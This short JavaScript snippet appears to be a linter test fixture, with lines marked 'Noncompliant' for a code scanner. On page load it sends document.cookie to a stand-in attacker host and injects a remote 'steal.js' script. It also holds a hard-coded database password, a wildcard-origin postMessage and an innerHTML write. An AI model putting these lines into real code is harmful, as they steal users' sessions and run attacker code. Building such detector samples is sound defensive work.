window.onload = function() {
  fetch(
    "http://hacking.gamesys.hack/hacks.json?cookiemonster=" +
      this.encodeURI(document.cookie)
  );

  function include(url) {
    var s = document.createElement("script");
    s.setAttribute("type", "text/javascript");
    s.setAttribute("src", url);
    document.body.appendChild(s);
  }
  include("http://hackers.com/steal.js"); // Noncompliant

  var db = window.openDatabase(
    "myDb",
    "1.0",
    "Personal secrets stored here",
    2 * 1024 * 1024
  ); // Noncompliant

  document.querySelector("body").innerHTML = '<a href="https://community.vuetifyjs.com" target="_blank">Discord Community</a>';

  var myWindow = document.getElementById('myIFrame').contentWindow;
myWindow.postMessage(message, "*"); // Noncompliant; how do you know what you loaded in 'myIFrame' is still there?


var mysql = require('mysql');

var connection = mysql.createConnection(
{
  host:'localhost',
  user: "admin",
  database: "project",
  password: "mypassword", // sensitive
  multipleStatements: true
});

connection.connect();

};
